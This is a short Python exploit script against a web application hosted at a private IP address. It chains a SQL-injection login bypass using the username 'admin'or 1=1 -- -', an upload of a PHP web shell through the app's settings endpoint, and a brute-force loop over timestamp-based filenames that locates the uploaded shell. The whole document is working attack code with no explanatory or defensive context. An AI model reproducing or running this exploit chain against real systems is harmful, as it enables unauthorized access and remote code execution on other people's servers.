#!/usr/bin/python3

import requests
import time

def sqli_admin():
        s = requests.Session()
        data = {"username":"admin'or 1=1 -- -","password":"mosaaed"}
        adminlogin = "http://192.168.137.112:10081/sta/ajax.php?action=save_settings"
        s.post(adminlogin,data=data)
        return s

def trigger_rce(session):
        starttime = int(time.time())
        multipart_form_data = {
        "name": ("cyberscurity"),
        "email": ("test@test.com"),
        "contact" : ("+11111111111"),
        "about" : ("attack"),
        "img" : ("shell.php", open("shell.php", "rb"))
        }
        session.post("http://192.168.137.112:10081/sta/ajax.php?action=save_settings", files=multipart_form_data)
        get_shell(starttime-100,starttime+100,session)


def get_shell(start,end,session):
        for i in range(start,end):
                 session.get("http://192.168.137.112:10081/sta/assets/uploads/"+str(i)+"_shell.php")
                 response = requests.get ("http://192.168.137.112:10081/sta/assets/uploads/"+ str(i) +"_shell.php")
                 if response.status_code == 200:
                            print("http://192.168.137.112:10081/sta/assets/uploads/"+str(i)+"_shell.php")
                        

def main():
        session = sqli_admin()
        trigger_rce(session)

if __name__ == '__main__':
        main()
            